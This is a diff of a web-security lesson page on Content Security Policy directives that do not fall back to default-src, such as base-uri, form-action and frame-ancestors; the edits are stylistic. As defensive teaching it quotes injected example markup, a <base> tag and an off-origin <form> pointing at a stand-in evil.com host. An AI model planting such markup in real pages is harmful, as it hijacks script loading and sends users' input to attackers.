@@ -3,17 +3,17 @@
 
 <p class="eyebrow">Content Security Policy · Lesson 4</p>
 <h1>Document, navigation &amp; riders</h1>
-<p class="lede">L3 ended on a warning: <code>default-src 'none'</code> locks down fetches and nothing else. This lesson is the "nothing else" — the directives that never consult <code>default-src</code> and so must be set by hand. They're what actually stop clickjacking, form exfiltration, and <code>&lt;base&gt;</code> hijacking, plus the "riders" that live in other specs but travel on the CSP header.</p>
+<p class="lede">L3 ended on a warning: <code>default-src 'none'</code> locks down fetches and nothing else. This lesson is the "nothing else", the directives that never consult <code>default-src</code> and so must be set by hand. They're what actually stop clickjacking, form exfiltration, and <code>&lt;base&gt;</code> hijacking, plus the "riders" that live in other specs but travel on the CSP header.</p>
 
 <h2>The concept</h2>
 
 <p>Three families sit outside the fetch cascade:<sup><a href="#s1">1</a></sup></p>
 <ul>
-<li><strong>Document</strong> — <code>base-uri</code>, <code>sandbox</code>: properties of the document itself.</li>
-<li><strong>Navigation</strong> — <code>form-action</code>, <code>frame-ancestors</code>: where the page can send you, and who can embed it.</li>
-<li><strong>Riders</strong> — <code>upgrade-insecure-requests</code>, <code>block-all-mixed-content</code> (deprecated), Trusted Types: defined in <em>separate</em> specs but delivered on the CSP header.</li>
+<li><strong>Document</strong> (<code>base-uri</code>, <code>sandbox</code>): properties of the document itself.</li>
+<li><strong>Navigation</strong> (<code>form-action</code>, <code>frame-ancestors</code>): where the page can send you, and who can embed it.</li>
+<li><strong>Riders</strong> (<code>upgrade-insecure-requests</code>, <code>block-all-mixed-content</code> (deprecated), Trusted Types): defined in <em>separate</em> specs but delivered on the CSP header.</li>
 </ul>
-<p>None of them fall back to <code>default-src</code>. Omit one and it's simply <strong>off</strong>. That single fact is the theme of the whole lesson.</p>
+<p>None of them fall back to <code>default-src</code>. Omit one and it's <strong>off</strong>. That is the theme of this lesson.</p>
 
 <h2>The steps</h2>
 
@@ -28,25 +28,25 @@ RIDERS      upgrade-insecure-requests   http → https    valueless · rewrites,
 </div>
 
 <h3>Step 1 — <code>base-uri</code>: shut the <code>&lt;base&gt;</code> hijack</h3>
-<p>A <code>&lt;base href&gt;</code> tag changes how <em>every relative URL</em> on the page resolves. If an attacker can inject one — <code>&lt;base href="https://evil.com/"&gt;</code> — then your relative <code>&lt;script src="app.js"&gt;</code> now loads from <code>evil.com/app.js</code>, and your <code>script-src 'self'</code> was checked <em>after</em> resolution, so it may well pass. <code>base-uri 'none'</code> (or <code>'self'</code>) forbids the injected tag outright. It's cheap, nothing legitimately needs it, and <code>default-src</code> won't cover it — which is why strict CSP always pins it.<sup><a href="#s1">1</a></sup></p>
+<p>A <code>&lt;base href&gt;</code> tag changes how <em>every relative URL</em> on the page resolves. If an attacker can inject one, <code>&lt;base href="https://evil.com/"&gt;</code>, then your relative <code>&lt;script src="app.js"&gt;</code> now loads from <code>evil.com/app.js</code>, and your <code>script-src 'self'</code> was checked <em>after</em> resolution, so it may well pass. <code>base-uri 'none'</code> (or <code>'self'</code>) forbids the injected tag outright. It's cheap, nothing legitimately needs it, and <code>default-src</code> won't cover it, which is why strict CSP always pins it.<sup><a href="#s1">1</a></sup></p>
 
 <h3>Step 2 — <code>sandbox</code>: the token-valued odd one</h3>
-<p>Unlike every directive so far, <code>sandbox</code> takes no source list — it takes the same <strong>tokens</strong> as the <code>&lt;iframe sandbox&gt;</code> attribute, applied to <em>your own</em> document. Bare <code>sandbox</code> (no tokens) is maximally restrictive: scripts off, forms off, popups off, forced into a unique opaque origin. You then re-enable selectively: <code>sandbox allow-scripts allow-forms allow-same-origin …</code>. Powerful but blunt; <code>allow-same-origin</code> dropped means your own storage/cookies vanish, so it's used deliberately, not casually.</p>
+<p>Unlike every directive so far, <code>sandbox</code> takes no source list: it takes the same <strong>tokens</strong> as the <code>&lt;iframe sandbox&gt;</code> attribute, applied to <em>your own</em> document. Bare <code>sandbox</code> (no tokens) is maximally restrictive: scripts off, forms off, popups off, forced into a unique opaque origin. You then re-enable selectively: <code>sandbox allow-scripts allow-forms allow-same-origin …</code>. Drop <code>allow-same-origin</code> and your own storage and cookies vanish, so reach for it deliberately.</p>
 
 <h3>Step 3 — <code>form-action</code>: stop the exfiltration form</h3>
-<p>Where may a <code>&lt;form&gt;</code> submit? An injection that adds <code>&lt;form action="https://evil.com" method="post"&gt;</code> (or rewrites an existing one) can POST whatever the user types straight off-origin. <code>connect-src</code> doesn't cover form navigation, and <code>default-src</code> doesn't back <code>form-action</code> — so without an explicit <code>form-action 'self'</code>, forms can target anywhere.<sup><a href="#s1">1</a></sup></p>
+<p>Where may a <code>&lt;form&gt;</code> submit? An injection that adds <code>&lt;form action="https://evil.com" method="post"&gt;</code> (or rewrites an existing one) can POST whatever the user types straight off-origin. <code>connect-src</code> doesn't cover form navigation, and <code>default-src</code> doesn't back <code>form-action</code>, so without an explicit <code>form-action 'self'</code>, forms can target anywhere.<sup><a href="#s1">1</a></sup></p>
 
 <h3>Step 4 — <code>frame-ancestors</code>: anti-clickjacking, and the <code>X-Frame-Options</code> successor</h3>
-<p>This is the <em>inverse</em> of <code>frame-src</code>: <code>frame-src</code> controls who <em>you</em> may frame; <code>frame-ancestors</code> controls who may frame <strong>you</strong> (via <code>&lt;frame&gt;</code>/<code>&lt;iframe&gt;</code>/<code>&lt;object&gt;</code>/<code>&lt;embed&gt;</code>) — the clickjacking defense. It accepts only <code>'none'</code>, <code>'self'</code>, and host/scheme sources; nonces, hashes, and <code>'unsafe-inline'</code> are meaningless here.<sup><a href="#s2">2</a></sup> Two sharp edges:</p>
+<p>This is the <em>inverse</em> of <code>frame-src</code>: <code>frame-src</code> controls who <em>you</em> may frame; <code>frame-ancestors</code> controls who may frame <strong>you</strong> (via <code>&lt;frame&gt;</code>/<code>&lt;iframe&gt;</code>/<code>&lt;object&gt;</code>/<code>&lt;embed&gt;</code>), the clickjacking defense. It accepts only <code>'none'</code>, <code>'self'</code>, and host/scheme sources; nonces, hashes, and <code>'unsafe-inline'</code> are meaningless here.<sup><a href="#s2">2</a></sup> Two sharp edges:</p>
 
 <div class="callout gotcha">
   <span class="tag">Edge — it supersedes <code>X-Frame-Options</code>, and it's header-only</span>
-  The CSP2 spec is explicit: <em>"The <code>frame-ancestors</code> directive obsoletes the <code>X-Frame-Options</code> header. If a resource has both policies, the <code>frame-ancestors</code> policy SHOULD be enforced and the <code>X-Frame-Options</code> policy SHOULD be ignored."</em> So in a modern browser, <code>frame-ancestors</code> wins; you keep <code>X-Frame-Options</code> only for ancient clients that don't understand CSP. And <code>frame-ancestors</code> is <strong>ignored inside a <code>&lt;meta&gt;</code> tag</strong> — it works only as an HTTP response header.<sup><a href="#s3">3</a></sup>
+  The CSP2 spec is explicit: <em>"The <code>frame-ancestors</code> directive obsoletes the <code>X-Frame-Options</code> header. If a resource has both policies, the <code>frame-ancestors</code> policy SHOULD be enforced and the <code>X-Frame-Options</code> policy SHOULD be ignored."</em> So in a modern browser, <code>frame-ancestors</code> wins; you keep <code>X-Frame-Options</code> only for ancient clients that don't understand CSP. And <code>frame-ancestors</code> is <strong>ignored inside a <code>&lt;meta&gt;</code> tag</strong>: it works only as an HTTP response header.<sup><a href="#s3">3</a></sup>
 </div>
 
 <h3>Step 5 — The riders: <code>upgrade-insecure-requests</code> &amp; Trusted Types</h3>
-<p><strong><code>upgrade-insecure-requests</code></strong> is <em>valueless</em>. It rewrites the page's <code>http://</code> subresource URLs to <code>https://</code> <em>before</em> the request hits the network. It <strong>rewrites, it doesn't block</strong> — and if the resource genuinely isn't on HTTPS, the request just fails (no HTTP fallback). It does not upgrade cross-origin top-level navigations, and it's no substitute for HSTS. Its deprecated cousin <code>block-all-mixed-content</code> <em>blocked</em> mixed content instead of upgrading it — now obsolete.<sup><a href="#s4">4</a></sup></p>
-<p><strong>Trusted Types</strong> (<code>require-trusted-types-for 'script'</code> + <code>trusted-types &lt;policies&gt;</code>) is the frontier. Instead of gating <em>where code loads from</em>, it gates the DOM <em>sinks</em> that turn strings into code — <code>innerHTML</code>, <code>eval</code>, <code>script.src</code> — requiring a typed, policy-sanitized value rather than a raw string. It targets DOM-based XSS, the class a source allowlist can't see because no network fetch is involved.<sup><a href="#s5">5</a></sup></p>
+<p><strong><code>upgrade-insecure-requests</code></strong> is <em>valueless</em>. It rewrites the page's <code>http://</code> subresource URLs to <code>https://</code> <em>before</em> the request hits the network. It <strong>rewrites rather than blocks</strong>, and if the resource isn't on HTTPS the request fails (no HTTP fallback). It does not upgrade cross-origin top-level navigations, and it's no substitute for HSTS. Its deprecated cousin <code>block-all-mixed-content</code> <em>blocked</em> mixed content instead of upgrading it, now obsolete.<sup><a href="#s4">4</a></sup></p>
+<p><strong>Trusted Types</strong> (<code>require-trusted-types-for 'script'</code> + <code>trusted-types &lt;policies&gt;</code>) is the frontier. Instead of gating <em>where code loads from</em>, it gates the DOM <em>sinks</em> that turn strings into code (<code>innerHTML</code>, <code>eval</code>, <code>script.src</code>), requiring a typed, policy-sanitized value rather than a raw string. It targets DOM-based XSS, the class a source allowlist can't see because no network fetch is involved.<sup><a href="#s5">5</a></sup></p>
 
 <h2>Why this matters</h2>
 
@@ -58,37 +58,37 @@ RIDERS      upgrade-insecure-requests   http → https    valueless · rewrites,
 
 <div class="callout interview">
   <span class="tag">Key line</span>
-  "Past the fetch family sit directives <code>default-src</code> never backstops: <code>base-uri</code> (kills <code>&lt;base&gt;</code> hijacking), <code>sandbox</code> (token-valued, like iframe sandbox on your own doc), <code>form-action</code> (submission targets), and <code>frame-ancestors</code> — the anti-clickjacking directive that supersedes <code>X-Frame-Options</code> and works only from the HTTP header. Plus riders from other specs: <code>upgrade-insecure-requests</code> rewrites http→https without blocking, and Trusted Types guards DOM injection sinks."
+  "Past the fetch family sit directives <code>default-src</code> never backstops: <code>base-uri</code> (kills <code>&lt;base&gt;</code> hijacking), <code>sandbox</code> (token-valued, like iframe sandbox on your own doc), <code>form-action</code> (submission targets), and <code>frame-ancestors</code>, the anti-clickjacking directive that supersedes <code>X-Frame-Options</code> and works only from the HTTP header. Plus riders from other specs: <code>upgrade-insecure-requests</code> rewrites http→https without blocking, and Trusted Types guards DOM injection sinks."
 </div>
 
 <div class="callout gotcha">
   <span class="tag">The trap</span>
-  Shallow: "<code>frame-ancestors</code> and <code>X-Frame-Options</code> do the same thing, set either." Deep: <code>frame-ancestors</code> <em>obsoletes</em> XFO — where both exist a modern browser ignores XFO — is more expressive (multiple origins, schemes), but is header-only, so a <code>&lt;meta&gt;</code> CSP can't clickjack-protect you. And neither falls back to <code>default-src</code>, so "I set <code>default-src 'none'</code>" gives zero framing protection.
+  Shallow: "<code>frame-ancestors</code> and <code>X-Frame-Options</code> do the same thing, set either." Deep: <code>frame-ancestors</code> <em>obsoletes</em> XFO (where both exist a modern browser ignores XFO), is more expressive (multiple origins, schemes), but is header-only, so a <code>&lt;meta&gt;</code> CSP can't clickjack-protect you. And neither falls back to <code>default-src</code>, so "I set <code>default-src 'none'</code>" gives zero framing protection.
 </div>
 
 <div class="recall">
   <p class="q">Recall — answer out loud before peeking:</p>
   <p>① Your policy is <code>default-src 'self'; script-src 'self'</code>. Can attacker-injected markup still redirect your relative script loads off-origin?</p>
   <details><summary>show answer</summary>
-  <p class="a"><strong>Yes</strong> — via an injected <code>&lt;base href="https://evil.com/"&gt;</code>. Relative <code>src</code>s resolve against it, and nothing here restricts <code>&lt;base&gt;</code>. You need <code>base-uri 'none'</code> (or <code>'self'</code>); <code>default-src</code> does not cover it.</p></details>
+  <p class="a"><strong>Yes</strong>, via an injected <code>&lt;base href="https://evil.com/"&gt;</code>. Relative <code>src</code>s resolve against it, and nothing here restricts <code>&lt;base&gt;</code>. You need <code>base-uri 'none'</code> (or <code>'self'</code>); <code>default-src</code> does not cover it.</p></details>
   <p>② Both <code>frame-ancestors 'self'</code> and <code>X-Frame-Options: DENY</code> are sent. What does a modern browser do?</p>
   <details><summary>show answer</summary>
   <p class="a">Enforces <code>frame-ancestors 'self'</code> and <strong>ignores</strong> <code>X-Frame-Options</code> (CSP2: frame-ancestors obsoletes XFO). Result: same-origin framing allowed, cross-origin blocked. XFO is only there for pre-CSP browsers.</p></details>
   <p>③ Does <code>upgrade-insecure-requests</code> block an <code>http://</code> image, or something else?</p>
   <details><summary>show answer</summary>
-  <p class="a">Neither blocks nor allows-as-is — it <strong>rewrites</strong> the URL to <code>https://</code> before fetching. If the resource isn't on HTTPS the request fails (no HTTP fallback). Blocking was the deprecated <code>block-all-mixed-content</code>'s job.</p></details>
+  <p class="a">Neither blocks nor allows-as-is: it <strong>rewrites</strong> the URL to <code>https://</code> before fetching. If the resource isn't on HTTPS the request fails (no HTTP fallback). Blocking was the deprecated <code>block-all-mixed-content</code>'s job.</p></details>
   <p>④ Why can't a source allowlist stop DOM-based XSS, and what addresses it?</p>
   <details><summary>show answer</summary>
-  <p class="a">DOM-XSS runs inside already-trusted script writing to sinks like <code>innerHTML</code> — no network fetch to gate, so <code>script-src</code> never sees it. <strong>Trusted Types</strong> (<code>require-trusted-types-for 'script'</code>) guards those sinks by demanding a typed, sanitized value instead of a raw string.</p></details>
+  <p class="a">DOM-XSS runs inside already-trusted script writing to sinks like <code>innerHTML</code> (no network fetch to gate), so <code>script-src</code> never sees it. <strong>Trusted Types</strong> (<code>require-trusted-types-for 'script'</code>) guards those sinks by demanding a typed, sanitized value instead of a raw string.</p></details>
 </div>
 
 <div class="callout">
   <span class="tag">Primary source — read this one</span>
-  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors">MDN — <code>frame-ancestors</code></a> (the XFO relationship, header-only rule, no default-src fallback) and <a href="https://www.w3.org/TR/CSP3/#directives-document">W3C CSP3 §6.2–6.4</a> for <code>base-uri</code>/<code>sandbox</code>/<code>form-action</code>. For Trusted Types, the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API">MDN Trusted Types API</a> is the on-ramp.
+  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors">MDN, <code>frame-ancestors</code></a> (the XFO relationship, header-only rule, no default-src fallback) and <a href="https://www.w3.org/TR/CSP3/#directives-document">W3C CSP3 §6.2–6.4</a> for <code>base-uri</code>/<code>sandbox</code>/<code>form-action</code>. For Trusted Types, the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API">MDN Trusted Types API</a> is the on-ramp.
 </div>
 
 <div class="ask-teacher">
-  <strong>Map complete.</strong> That's the whole directive catalogue — the fetch family (L3) plus this non-fetch set. <strong>Lesson 5 rewinds and tells the <em>story</em>: CSP1 vs CSP2 vs CSP3 — where these directives came from, in which level, and why.</strong>
+  <strong>Map complete.</strong> That's the whole directive catalogue, the fetch family (L3) plus this non-fetch set. <strong>Lesson 5 rewinds and tells the <em>story</em>: CSP1 vs CSP2 vs CSP3, where these directives came from, in which level, and why.</strong>
 </div>
 
 <div class="course-nav">
@@ -99,9 +99,9 @@ RIDERS      upgrade-insecure-requests   http → https    valueless · rewrites,
 
 <hr style="border:none;border-top:1px solid var(--rule);margin:2.5rem 0 1rem">
 <p class="src"><strong>Sources</strong><br>
-<span id="s1">1.</span> <code>base-uri</code>, <code>sandbox</code>, <code>form-action</code> definitions and no-default-src-fallback — <a href="https://www.w3.org/TR/CSP3/#directives-document">W3C CSP Level 3 §6.2–6.4</a>.<br>
-<span id="s2">2.</span> <code>frame-ancestors</code> governed elements &amp; accepted source values — <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors">MDN: frame-ancestors</a>.<br>
-<span id="s3">3.</span> "frame-ancestors obsoletes X-Frame-Options… SHOULD be enforced and X-Frame-Options SHOULD be ignored"; ignored via <code>&lt;meta&gt;</code> — <a href="https://www.w3.org/TR/CSP2/#directive-frame-ancestors">W3C CSP Level 2 §frame-ancestors</a>.<br>
-<span id="s4">4.</span> <code>upgrade-insecure-requests</code> rewrites (not blocks), fails without HTTP fallback, doesn't upgrade third-party navigation — <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/upgrade-insecure-requests">MDN: upgrade-insecure-requests</a>.<br>
-<span id="s5">5.</span> Trusted Types guard DOM injection sinks — <a href="https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API">MDN: Trusted Types API</a>.
+<span id="s1">1.</span> <code>base-uri</code>, <code>sandbox</code>, <code>form-action</code> definitions and no-default-src-fallback, <a href="https://www.w3.org/TR/CSP3/#directives-document">W3C CSP Level 3 §6.2–6.4</a>.<br>
+<span id="s2">2.</span> <code>frame-ancestors</code> governed elements &amp; accepted source values, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors">MDN: frame-ancestors</a>.<br>
+<span id="s3">3.</span> "frame-ancestors obsoletes X-Frame-Options… SHOULD be enforced and X-Frame-Options SHOULD be ignored"; ignored via <code>&lt;meta&gt;</code>, <a href="https://www.w3.org/TR/CSP2/#directive-frame-ancestors">W3C CSP Level 2 §frame-ancestors</a>.<br>
+<span id="s4">4.</span> <code>upgrade-insecure-requests</code> rewrites (not blocks), fails without HTTP fallback, doesn't upgrade third-party navigation, <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/upgrade-insecure-requests">MDN: upgrade-insecure-requests</a>.<br>
+<span id="s5">5.</span> Trusted Types guard DOM injection sinks, <a href="https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API">MDN: Trusted Types API</a>.
 </p>
